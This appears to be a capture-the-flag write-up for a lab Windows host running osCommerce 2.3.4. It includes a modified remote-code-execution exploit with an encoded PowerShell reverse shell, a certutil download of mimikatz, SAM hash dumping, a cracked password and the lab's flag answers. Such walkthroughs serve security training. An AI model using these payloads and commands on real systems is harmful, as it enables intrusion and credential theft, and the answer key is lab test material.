
# IP:

# PORT SCANNING

```powershell
80/tcp    open  http         syn-ack ttl 126
135/tcp   open  msrpc        syn-ack ttl 126
139/tcp   open  netbios-ssn  syn-ack ttl 126
443/tcp   open  https        syn-ack ttl 126
445/tcp   open  microsoft-ds syn-ack ttl 126
3306/tcp  open  mysql        syn-ack ttl 126
8080/tcp  open  http-proxy   syn-ack ttl 126
49152/tcp open  unknown      syn-ack ttl 126
49153/tcp open  unknown      syn-ack ttl 126
49154/tcp open  unknown      syn-ack ttl 126
49158/tcp open  unknown      syn-ack ttl 126
49159/tcp open  unknown      syn-ack ttl 126
49160/tcp open  unknown      syn-ack ttl 126


```


# Webserver

```powershell
#nothing on 80

# directory listing is available on 8080

#banner:
Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28 Server at 10.201.108.39 Port 8080

We find http://10.201.40.166:8080/oscommerce-2.3.4/catalog/


>>> searchsploit oscommerce 2.3.4


------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities                                                                                               | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                                                                             | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                                                                          | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                                                                           | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                                                                              | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                                                                                | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                                                                                | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)                                                                                            | php/webapps/50128.py
------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------

Downloaded 44374.py

Modified the script according to the instructions:

# ----------- Main sections that were modified ----------------:

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://10.201.40.166:8080/oscommerce-2.3.4/catalog/"
target_url = "http://10.201.40.166:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

payload = '\');'
payload += 'shell_exec("powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4ANgAuADEANQAuADEAOQAyACIALAAgADEAMwAzADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"); '    # this is where you enter you PHP payload
payload += '/*'

# ----------- Main sections that were modified ----------------:
#set up a listener execute the script
>>> rlwrap nc -nlvp 1337
>>> python2 44374.py
[+] Successfully launched the exploit. Open the following URL to execute your code

http://10.201.40.166:8080/oscommerce-2.3.4/catalog/install/includes/configure.php

# We are in with escalated priv (NT AUTHORTIY)

PS C:\Users\Administrator\Desktop> whoami
nt authority\system

PS C:\Users\Administrator\Desktop> type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}

# we need to dump NTLM hashes
>>> (attackbox) mimikatz -h
>>> python3 -m http.server

>>>(target) cd c:\Temp
>>> PS C:\Temp> certutil -urlcache -split -f "http://10.6.15.192:8000/mimikatz.exe" mimikatz.exe

# Usually you can run mimikatz and run lsadump::sam to dump NLTM hashes
# Since I'm using a base64 powershell session that isn't great, I'll pass the arguments like this
>>> PS C:\Temp> .\mimikatz.exe "lsadump::sam" "exit"

mimikatz(commandline) # lsadump::sam
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450
 

# crack the hash for the lab user
# Use https://crackstation.net/

30e87bf999828446a1c1209ddde4c450	NTLM	googleplus

# the password is googleplus

```


# Answers

```Powershell

# ANSWER 1: "Lab" user NTLM hash decrypted
googleplus

# ANSWER 2: Root flag:
PS C:\Users\Administrator\Desktop> type root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}

```



